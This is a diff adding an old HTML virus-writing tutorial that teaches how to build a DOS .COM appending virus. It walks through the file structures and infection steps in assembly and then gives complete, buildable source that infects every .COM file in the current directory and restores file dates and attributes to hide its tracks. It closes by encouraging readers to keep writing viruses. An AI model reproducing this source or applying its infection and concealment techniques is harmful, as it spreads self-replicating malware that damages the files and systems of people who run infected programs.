@@ -1,0 +1,383 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Stealth Warrior - .COM Appending Virus</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>.COM Appending Virus<BR>
+by<BR>
+Stealth Warrior/The Alliance</FONT></FONT></B></P></CENTER>
+<B><FONT COLOR="#004080"><FONT SIZE=+2></FONT></FONT></B>
+<UL>
+<UL>
+<PRE>My page: http://www.geocities.com/SiliconValley/Heights/5303
+My E-Mail address: stealthwarrior@hotmail.com</PRE>
+</UL>
+
+<PRE>
+
+ ----------------------------------------------------------------------------
+ DISCLAIMER:
+ Information included in this file is not to be used in any malicious or
+ otherwise irresponsible manner. The author is not responsible for any
+ damages, incidental or otherwise, resulting from using information from
+ this file. Responsibility is entirely placed on the reader (user).
+ ----------------------------------------------------------------------------
+
+Now when we're familiar with overwriting viruses, let's go on to appending
+viruses. To understand appending viruses we first must know the structure of
+the files we want to infect. We will start with .COM files as they are the
+easiest. So, here we go:
+When a .COM file is run, DOS builds the PSP, loads the file in memory above
+PSP and then executes it (from memory, not from disk!). PSP is a 256 byte
+long header and it looks like this:
+
+.--------.------.-------------------------------------------.
+| OFFSET | SIZE | DESCRIPTION                               |
+.--------.------.-------------------------------------------.
+|   00h  |   2  | INT 20h instruction (Program Terminate).  |
+|   02h  |   2  | Address of the last paragraph of memory   |
+|        |      | allocated to the program.                 |
+|   04h  |   1  | Reserved.                                 |
+|   05h  |   5  | CP/M Far call to DOS INT 21h,except put   |
+|        |      | the function call in CL not AH like usual.|
+|   0Ah  |   4  | INT 22h segment handler.                  |
+|   0Eh  |   4  | INT 23h segment handler.                  |
+|  012h  |   4  | INT 24h segment handler.                  |
+|  016h  |  22  | Reserved.                                 |
+|  02Ch  |   2  | Enviroment segment.Includes the drive\    |
+|        |      | path\filename.extension of the program.   |
+|  02Eh  |  34  | Reserved.                                 |
+|  050h  |   3  | INT 21h followed by a RETF.               |
+|  053h  |   9  | Reserved.                                 |
+|  05Ch  |  16  | File Control Block 1.It is for use with   |
+|        |      | OLD DOS functions.DOS 2.0 introduces      |
+|        |      | handles,which are much easier to use.     |
+|  06Ch  |  20  | File Control Block 2.                     |
+|  080h  | 128  | Command line parameters.                  |
+|        |      | Default DTA (Disk Transfer Area).         |
+.--------.------.-------------------------------------------.
+    Total: 256
+
+And DTA (Disk Transfer Area) looks like this:
+    Offset     Size       Description
+      0h       21 BYTES   Reserved
+     15h       BYTE       File attribute
+     16h       WORD       File time
+     18h       WORD       File date
+     1Ah       DWORD      File size
+     1Eh       13 BYTES   ASCIIZ file name and extension
+
+The file starts at offset 100h of the segment where it's loaded. Because of
+the segment length limit .COM files can only be 65280 bytes long, so we will
+infect files smaller than 64000 bytes to prevent the PSP to get corrupted.
+If we want to infect a .COM file, we change the first 3 bytes of the host, so
+they point to the virus which we appended at the end of the host. And after
+the virus has executed, it restores the original 3 bytes of the host and
+jumps to 100h. You mustn't forget that we put original 3 bytes in memory and
+that the first 3 bytes of the file on disk still contain a jump to a virus!
+After that the host runs like nothing has happened.
+I've put some extra code here - it preserves file date, time and attributes
+and it can infect a .COM file with any attribute. It is important for virus
+to cover its tracks as much as possible, so get used to it right now at the
+beginning of your learning about viruses.
+
+Here's a new flow-chart:
+  1.Calculate the delta OFFSET.
+  2.Restore 3 bytes.
+  3.Save DTA.
+  4.Find a .COM file. If no files found then go to step 15.
+  5.Save file attributes, date and time.
+  6.Clear file attributes.
+  7.Open the file for reading/writing.
+  8.Read the first 3 bytes.
+
+  9.Check if the file is already infected.
+     a)If already infected then go to step 14.
+     b)If not infected continue.
+ 10.Write new 3 bytes at the beginning of the file.
+ 11.Append the virus to the file.
+ 12.Restore time and date.
+ 13.Close the file.
+ 14.Restore attributes.
+ 15.Restore DTA.
+ 16.Pass the control to the host (in memory!).
+
+Here's how it's done:
+  1.First we must calculate the delta OFFSET, because you mustn't forget that
+    the real OFFSET of our variables depends on size of the file:
+
+        begin:  db 0e9h,0,0                       ;Jump to vstart.
+        vstart: call doit
+        doit:   pop  bp                           ;&lt;Calculate the
+                sub  bp,OFFSET doit               ; delta OFFSET.&gt;
+
+  2.And now we restore original 3 bytes which we saved into bytes when this
+    file was infected:
+
+        lea  si,[bp+OFFSET bytes]                 ;&lt;Restore
+        mov  di,100h                              ; the
+        push di                                   ; original
+        movsw                                     ; three
+        movsb                                     ; bytes.&gt;
+
+  3.DTA is located at the same address in the PSP as the command-line
+    parameters, so we have to store DTA to prevent the loss of command-line
+    parameters. Of course we have to restore it before we pass control to the
+    host.
+
+        lea  dx,[bp+OFFSET dta]           ;&lt;Save disk
+        mov  ah,1ah                       ; transfer
+        int  21h                          ; area(DTA).&gt;
+
+    We have to define dta, so:
+        dta db 42 dup (?)
+
+  4.We use DOS function Int 21h/4eh to find the first file. You should be
+    familiar with this from Overwriting Virus Tutorial.
+
+        mov  ah,4eh                       ;Find first service.
+        lea  dx,[bp+com_files]            ;&lt;Search for a .COM file
+        mov  cx,7                         ; with any attributes.&gt;
+        int  21h
+
+    We have to define what com_files means, so:
+     com_files: db &quot;*.com&quot;,0
+
+  5.File attributes, date and time are saved and we restore them later.
+
+        lea  si,[bp+OFFSET dta+21]        ;&lt;Save file
+        mov  cx,5                         ; attributes,
+        lea  di,[bp+OFFSET attributes]    ; date and
+        rep  movsb                        ; time.&gt;
+
+  6.Here we clear the file attributes so that we could write to it in case it
+    is read-only, hidden or system.
+
+        mov  ax,4301h                     ;&lt;Clear
+        xor  cx,cx                        ; the
+        lea  dx,[bp+dta+30]               ; file
+        int  21h                          ; attributes.&gt;
+
+  7.Nothing new here...
+
+
+        mov  ax,3d02h                     ;&lt;Open file for
+        lea  dx,[bp+OFFSET dta+30]        ; reading and
+        int  21h                          ; writing.&gt;
+
+  8.Here we read the first three bytes and store them to bytes. We need them
+    to check if the file is already infected and to restore them before we
+    pass control to the host.
+
+        xchg ax,bx                        ;Put file handle in ax.
+        mov  ah,3fh                       ;&lt;Read first
+        lea  dx,[bp+bytes]                ; three bytes
+        mov  cx,3                         ; and store them
+        int  21h                          ; in bytes.&gt;
+
+  9.Here we compare the file size from DTA and last two bytes from bytes. If
+    the file is infected, then bytes contains a jump (E9) and an offset which
+    points to the beginning of the virus. A bit of mathematics and we have an
+    infection check:
+
+        mov  ax,word ptr [bp+dta+26]      ;Get file size from DTA.
+        mov  cx,word ptr [bp+bytes+1]     ;Get jmp location.
+        add  cx,vend-vstart+3             ;Convert it to file size.
+        cmp  ax,cx                        ;Compare both file sizes.
+        jz   another                      ;Equal,so find next victim.
+
+ 10.Here we put new OFFSET into new_offs and write new three bytes (E9 [it's
+    a code for JMP] xx xx [new OFFSET]):
+
+        sub  ax,3                         ;&lt;Put new OFFSET
+        mov  word ptr [bp+new_offs],ax    ; in new_offs.&gt;
+        mov  ax,4200h                     ;&lt;Go to
+        xor  cx,cx                        ; beginning
+        cwd                               ; of the
+        int  21h                          ; file.&gt;
+        mov  ah,40h                       ;&lt;Write
+        mov  cx,3                         ; new
+        lea  dx,[bp+e9]                   ; three
+        int  21h                          ; bytes.&gt;
+
+    If you haven't noticed: new_offs dw ? has to be written under e9 db 0e9h
+    in the virus source to work properly. It is because we put beginning
+    OFFSET in dx (lea  dx,[bp+e9]) and after 0e9h is written to file, 2 bytes
+    from the new_offs follow. Simple, isn't it?
+
+ 11.Here we write our virus to the end of the file:
+
+        mov  ax,4202h                     ;&lt;Go to
+        xor  cx,cx                        ; end
+
+        cwd                               ; of the
+        int  21h                          ; file.&gt;
+        mov  ah,40h                       ;&lt;Append
+        mov  cx,vend-vstart               ; the virus
+        lea  dx,[bp+vstart]               ; to the
+        int  21h                          ; host.&gt;
+
+ 12.Now when the main job is done we cover our tracks, first with file time
+    and file date:
+
+        mov  ax,5701h                     ;&lt;Restore
+        mov  dx,word ptr [bp+date]        ; original
+        mov  cx,word ptr [bp+time]        ; file time
+        int  21h                          ; and date.&gt;
+
+ 13.Close the file, nothing new...
+
+        mov  ah,3eh                       ;&lt;Close the
+        int  21h                          ; file.&gt;
+
+ 14.Covering our tracks, part two. Here we restore file attributes:
+
+        mov  ax,4301h                     ;&lt;Restore
+        lea  dx,[bp+OFFSET dta+30]        ; original
+        xor  ch,ch                        ; attributes
+        mov  cl,byte ptr [bp+attributes]  ; of the
+        int  21h                          ; file.&gt;
+
+ 15.Now we restore DTA --&gt; command-line parameters are preserved:
+
+        mov  dx,80h                       ;Restore DTA.
+        mov  ah,1ah                       ;&lt;Set disk transfer
+        int  21h                          ; address.&gt;
+
+ 16.Here we pass control to the host (in memory!!!):
+
+        retn                              ;Pass control to the host.
+
+
+Here's the complete source:
+-&lt;EXAMPLE1.ASM&gt;---------------------------------------------------------------
+;Example 1 from .COM Appending Virus Tutorial by Stealth Warrior
+;.COM appending virus - 211 bytes long, infects all .COM files in current dir
+;Instructions:
+; TASM /m2 EXAMPLE1.ASM
+; TLINK /t EXAMPLE1.ASM
+code    segment
+assume  cs:code
+        org 100h
+begin:  db 0e9h,0,0                       ;Jump to vstart.
+vstart: call doit
+doit:   pop  bp                           ;&lt;Calculate the
+        sub  bp,OFFSET doit               ; delta OFFSET.&gt;
+        lea  si,[bp+OFFSET bytes]         ;&lt;Restore
+        mov  di,100h                      ; the
+        push di                           ; original
+        movsw                             ; three
+        movsb                             ; bytes.&gt;
+
+        lea  dx,[bp+OFFSET dta]           ;&lt;Save disk
+        mov  ah,1ah                       ; transfer
+        int  21h                          ; area(DTA).&gt;
+first:  mov  ah,4eh                       ;Find first service.
+        lea  dx,[bp+com_files]            ;&lt;Search for a .COM file
+        mov  cx,7                         ; with any attributes.&gt;
+next:   int  21h
+        jnb  got_it                       ;We found a .COM file.
+        jmp  quit                         ;No more .COM files,so quit.
+got_it: lea  si,[bp+OFFSET dta+21]        ;&lt;Save file
+        mov  cx,5                         ; attributes,
+        lea  di,[bp+OFFSET attributes]    ; date and
+        rep  movsb                        ; time.&gt;
+        mov  ax,4301h                     ;&lt;Clear
+        xor  cx,cx                        ; the
+        lea  dx,[bp+dta+30]               ; file
+        int  21h                          ; attributes.&gt;
+        mov  ax,3d02h                     ;&lt;Open file for
+        lea  dx,[bp+OFFSET dta+30]        ; reading and
+        int  21h                          ; writing.&gt;
+        xchg ax,bx                        ;Put file handle in ax.
+        mov  ah,3fh                       ;&lt;Read first
+        lea  dx,[bp+bytes]                ; three bytes
+        mov  cx,3                         ; and store them
+        int  21h                          ; in bytes.&gt;
+        mov  ax,word ptr [bp+dta+26]      ;Get file size from DTA.
+        mov  cx,word ptr [bp+bytes+1]     ;Get jmp location.
+        add  cx,vend-vstart+3             ;Convert it to file size.
+        cmp  ax,cx                        ;Compare both file sizes.
+        jz   another                      ;Equal,so find next victim.
+        sub  ax,3                         ;&lt;Put new OFFSET
+        mov  word ptr [bp+new_offs],ax    ; in new_offs.&gt;
+        xor  al,al                        ;Go to BOF.
+        call move_fp
+        mov  ah,40h                       ;&lt;Write
+        mov  cx,3                         ; new
+        lea  dx,[bp+e9]                   ; three
+        int  21h                          ; bytes.&gt;
+        mov  al,2                         ;Go to EOF.
+        call move_fp
+        mov  ah,40h                       ;&lt;Append
+        mov  cx,vend-vstart               ; the virus
+        lea  dx,[bp+vstart]               ; to the
+        int  21h                          ; host.&gt;
+        mov  ax,5701h                     ;&lt;Restore
+        mov  dx,word ptr [bp+date]        ; original
+        mov  cx,word ptr [bp+time]        ; file time
+        int  21h                          ; and date.&gt;
+another:mov  ah,3eh                       ;&lt;Close the
+        int  21h                          ; file.&gt;
+        mov  ax,4301h                     ;&lt;Restore
+        lea  dx,[bp+OFFSET dta+30]        ; original
+        xor  ch,ch                        ; attributes
+        mov  cl,byte ptr [bp+attributes]  ; of the
+        int  21h                          ; file.&gt;
+        mov  ah,4fh                       ;Find next service.
+        jmp  next                         ;Do it.
+quit:   mov  dx,80h                       ;Restore DTA.
+        mov  ah,1ah                       ;&lt;Set disk transfer
+        int  21h                          ; address.&gt;
+        retn                              ;Pass control to the host.
+move_fp:mov  ah,42h
+        xor  cx,cx
+        cwd
+        int  21h
+        retn
+
+com_files db '*.com',0
+bytes db 0cdh,20h,0
+e9 db 0e9h
+vend equ $                                ;&lt;Everything below this point
+                                          ; isn't written to a host because
+                                          ; it's temporal info and would
+                                          ; just increase the size of the
+                                          ; virus.&gt;
+new_offs dw ?                             ;Here we put new OFFSET.
+attributes db ?                           ;Here we put file attributes.
+time dw ?                                 ;Here we put file time.
+date dw ?                                 ;Here we put file date.
+dta db 42 dup (?)                         ;Here we put DTA.
+code    ENDS
+        END    begin
+------------------------------------------------------------------------------
+
+That's it! If you don't get it yet, read my Overwriting Virus Tutorial and
+then this tutorial again. It will help, you'll see. The most important thing
+is not to give up!
+So, keep writing viruses and be prepared for my next tutorial!
+
+You can get all my tutorials and more at my page - see the beginning of this
+
+file for the address.
+
+Greetz'n'thanx to:
+  -The Alliance : Yo to all memberz
+  -P/S : a great group, your tutorials and 40hex helped me a lot
+  -NuKE : a great group too, Rock Steady's tutorials are cool
+  -VLAD : a great magazine, guys
+  -Immortal Riot : I like your 'zine
+  -Ratboy : cool tutorial
+  -all other virus writers in the world!</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
